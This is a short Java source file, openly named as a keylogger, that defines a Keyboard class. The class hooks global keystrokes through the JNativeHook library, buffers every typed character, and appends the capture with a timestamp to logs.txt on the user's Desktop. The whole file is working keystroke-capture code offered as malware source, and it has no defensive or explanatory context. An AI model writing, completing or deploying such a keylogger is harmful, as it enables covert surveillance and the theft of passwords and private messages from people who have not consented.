package me.obsidianbreaker.keylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;

public class Keyboard implements NativeKeyListener {

    private static StringBuilder typedCache = new StringBuilder();

    public Keyboard() {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        typedCache.append(e.getKeyChar());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public static void onSave() {
        try {

            FileWriter fw = new FileWriter(System.getProperty("user.home") + "\\Desktop\\logs.txt", true); //Path
            fw.append("\n\n---==ObsidianBreaker's Keylogger==--- " + new Date().toString() + "\n"); //Separator
            fw.write(typedCache.toString());
            fw.close();
            typedCache = new StringBuilder(); // clean cache
        } catch(IOException ioe) {
            ioe.printStackTrace();
        }
    }

}
